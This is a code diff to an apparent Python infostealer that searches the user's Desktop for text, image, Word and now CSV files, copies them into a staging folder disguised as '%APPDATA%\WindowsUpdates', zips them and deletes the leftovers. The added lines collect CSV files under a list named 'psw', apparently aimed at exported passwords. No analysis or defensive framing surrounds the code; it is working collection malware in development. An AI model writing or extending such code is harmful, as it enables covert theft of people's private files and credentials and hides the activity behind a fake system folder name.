@@ -4,10 +4,12 @@ import os
 target_path_txt = rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt"
 target_path_images = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images"
 target_path_docx = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx"
+target_path_psw = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\csv"
 
 txt = []
 images = []
 docx = []
+psw = []
 
 def main():
     desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
@@ -38,6 +40,8 @@ def get_files(path):
                     images.append(os.path.join(root, file))
                 elif file.endswith(".docx"):
                     docx.append(os.path.join(root, file))
+                elif file.endswith(".csv"):
+                    psw.append(os.path.join(root, file))
             for dir in dirs:
                 get_files(dir)
         
@@ -47,6 +51,8 @@ def get_files(path):
             copy(file, target_path_images)
         for file in docx:
             copy(file, target_path_docx)
+        for file in psw:
+            copy(file, target_path_psw)
 
 def remove_remnants(path):
     for root, dirs, files in os.walk(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files"):
@@ -57,5 +63,6 @@ main()
 make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\txt")
 make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\images")
 make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\docx")
+make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\csv", "zip", rf"{os.getenv('APPDATA')}\WindowsUpdates\csv")
 
 remove_remnants(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
